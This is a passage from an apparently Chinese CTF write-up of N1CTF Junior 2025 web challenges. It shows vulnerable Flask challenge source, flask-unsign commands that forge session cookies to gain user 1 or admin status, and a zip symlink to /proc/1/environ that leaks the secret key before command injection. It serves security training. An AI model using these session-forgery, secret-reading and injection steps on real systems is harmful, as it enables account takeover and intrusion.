class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;% block content %&#125;&#125;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p style=&quot;margin-top: 1.5rem;&quot;&gt;&lt;a href=&quot;&#123;&#123;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&#125;&#125;&quot;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &#123;&#123;% endblock %&#125;&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/bio/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_bio</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.username == username:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span></span><br><span class="line">    user = USERS_DB.get(username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> user.bio</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            browser = p.chromium.launch(headless=<span class="literal">True</span>, args=[<span class="string">&quot;--no-sandbox&quot;</span>])</span><br><span class="line">            context = browser.new_context()</span><br><span class="line"></span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">            &#125;])</span><br><span class="line"></span><br><span class="line">            page = context.new_page()</span><br><span class="line">            page.goto(<span class="string">&quot;http://localhost/login&quot;</span>, timeout=<span class="number">5000</span>)</span><br><span class="line">            page.fill(<span class="string">&quot;input[name=&#x27;username&#x27;]&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">            page.fill(<span class="string">&quot;input[name=&#x27;password&#x27;]&quot;</span>, admin_password)</span><br><span class="line">            page.click(<span class="string">&quot;input[name=&#x27;submit&#x27;]&quot;</span>)</span><br><span class="line">            page.wait_for_timeout(<span class="number">3000</span>)</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)</span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            browser.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Bot error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>备忘记录：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -c &quot;.eJwlzjEOwjAMBdC7ZGZI8u3E7WWQ7diCtaUT4u4g8U7w3uWeR5yPsr-OK27l_lxlL2BXEa8Qo-AwWIu-Kk-VJWibdXemmCtrODjb1qSxBgDySoZNqQ1FVDUsmJstCkQjH507U41VFakkY0Kt50zhFAyCpIzyi1xnHP9NL58v5UYvgQ.aMVFEw.<span class="number">81</span>TmDMSKcaBm9WkEwbGnRHg9T-k&quot; -s &quot;your-secret-key-here&quot;</span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;<span class="number">35</span>ca88c038b4e5eb3b1e2d057a8d8319b2cc54e7df0ec35f191815ae3334c04b39a416a3e0ab3d3bcbbd4e3e14c6252540ed0a3fa48673ab2f7f85f836438f86&#x27;, &#x27;_user_id&#x27;: &#x27;<span class="number">2</span>&#x27;&#125;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;<span class="number">35</span>ca88c038b4e5eb3b1e2d057a8d8319b2cc54e7df0ec35f191815ae3334c04b39a416a3e0ab3d3bcbbd4e3e14c6252540ed0a3fa48673ab2f7f85f836438f86&#x27;, &#x27;_user_id&#x27;: &#x27;<span class="number">1</span>&#x27;&#125;&quot; -s &quot;your-secret-key-here&quot;</span><br><span class="line">.eJwlzjEOwjAMBdC7ZGaI8-<span class="number">3</span>E7WWQ7TiCtaUT4u4g8U7w3uW-jjwfZX8dV97K_TnLXiBhqlGhzinpcMo2qwzTqaDNW4RwjrlqBmTRRkpiCYCjsmMzpm7Iao4JD_fJiSSO3qQJ15zVsIy1D5i3NZbKUnSGLu3lF7nOPP4bKp8v5UMvgA.aMVFrg.JrnkPUswwGTxNNFhx5C8fzbCeJU</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie &quot;&lt;your_cookie&gt;&quot; --secret &quot;your-secret-key-here&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flask-unsign --sign --cookie &quot;&#123;\&quot;_fresh\&quot;: true, \&quot;_id\&quot;: \&quot;<span class="number">35</span>ca88c038b4e5eb3b1e2d057a8d8319b2cc54e7df0ec35f191815ae3334c04b39a416a3e0ab3d3bcbbd4e3e14c6252540ed0a3fa48673ab2f7f85f836438f86\&quot;, \&quot;_user_id\&quot;: \&quot;<span class="number">1</span>\&quot;&#125;&quot; --secret &quot;your-secret-key-here&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h2 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h2><p>看个源码先：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for,send_file,render_template, session, send_from_directory, abort, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.environ.get(<span class="string">&quot;FLASK_SECRET_KEY&quot;</span>, <span class="string">&quot;test_key&quot;</span>)</span><br><span class="line">UPLOAD_FOLDER = os.path.join(os.getcwd(), <span class="string">&quot;uploads&quot;</span>)</span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;upload&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;用户名已存在&quot;</span></span><br><span class="line"></span><br><span class="line">        users[username] = &#123;<span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&quot;password&quot;</span>] == password:</span><br><span class="line">            session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">            session[<span class="string">&quot;role&quot;</span>] = users[username][<span class="string">&quot;role&quot;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;upload&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;用户名或密码错误&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;未选择文件&quot;</span></span><br><span class="line"></span><br><span class="line">        role = session[<span class="string">&quot;role&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">        target_dir = os.path.join(UPLOAD_FOLDER, dirname)  <span class="comment"># target_dir = UPLOAD_FOLDER/dirname</span></span><br><span class="line">        os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">        file.save(zip_path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解压失败，请检查文件格式&quot;</span></span><br><span class="line"></span><br><span class="line">        os.remove(zip_path)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解压完成！&lt;br&gt;下载地址: &lt;a href=&#x27;<span class="subst">&#123;url_for(<span class="string">&#x27;download&#x27;</span>, folder=dirname)&#125;</span>&#x27;&gt;<span class="subst">&#123;request.host_url&#125;</span>download/<span class="subst">&#123;dirname&#125;</span>&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">folder</span>):</span><br><span class="line">    target_dir = os.path.join(UPLOAD_FOLDER, folder)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">    files = os.listdir(target_dir)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;download.html&quot;</span>, folder=folder, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">folder, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_FOLDER, folder ,filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        <span class="keyword">return</span> Response(</span><br><span class="line">            content,</span><br><span class="line">            mimetype=<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">f&quot;attachment; filename=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进去想到需要获取admin权限才能可控文件名从而导致命令注入，想到session 伪造，但是key是假的，不会了。。。</p>
+<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250913204257.png" alt="20250913204257"></p>
+<p>后来发现key并不是假的（，于是直接伪造session，成功获取admin权限。再直接文件命名自定义，命令注入反弹shell就可以了！</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">y</span>@7<span class="title">q</span>&gt;<span class="title">flask</span>-<span class="title">unsign</span> --<span class="title">sign</span> --<span class="title">cookie</span> &quot;&#123;\&quot;<span class="title">role</span>\&quot;:\&quot;<span class="title">admin</span>\&quot;,\&quot;<span class="title">username</span>\&quot;:\&quot;1\&quot;&#125;&quot; --<span class="title">secret</span> &quot;<span class="title">test_key</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6IjEifQ.aMZePw</span>.-<span class="title">Z3bWPHYiSn6el14kBTUV5Edflc</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这时候我感觉已经通了，但碰巧的是此时得知靶机坏了，启动不了，于是直到下午我再去打的时候发现，key在靶机里不是真的（，导致我白高兴一场。<br>这时候就在想，考点肯定是获取key了，看了一下dockerfile，发现是从环境变量里获取的，于是就想着能不能从环境变量里获取key。<br>那从哪里获取文件呢？这时候就想到是不是能从upload和download两个路由下手下载到想要的文件呢？我想到目录遍历了，然鹅这里路由格式限制的很死<code>@app.route(&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;)</code>只能是这样，加上folder在普通用户权限下是随机的uuid，不可控。只有filename可以。后来经过队里师傅点拨，了解到了软链接可以直接指定读取位置，只要能上传带软链接的压缩包就可以直接读取任意文件了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /proc/1/environ link_1</span><br><span class="line">zip link.zip link_1</span><br></pre></td></tr></table></figure>
+
+<p>读取到key后伪造session成功拿到admin权限，命令注入写在根目录下1.txt再用一次符号链接读取即可。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.txt</span><br><span class="line">1.txt#</span><br><span class="line">app</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">entrypoint.sh</span><br><span class="line">etc</span><br><span class="line">flag-8qW3Xx1pv9Uipdw32Zm2AvrUMKgsxm6U.txt</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#N1CTF-Junior-2025-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">N1CTF Junior 2025 赛后复现记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ping"><span class="toc-number">1.1.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unfinished"><span class="toc-number">1.2.</span> <span class="toc-text">Unfinished</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#online-unzipper"><span class="toc-number">1.3.</span> <span class="toc-text">online_unzipper</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    y@7q
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
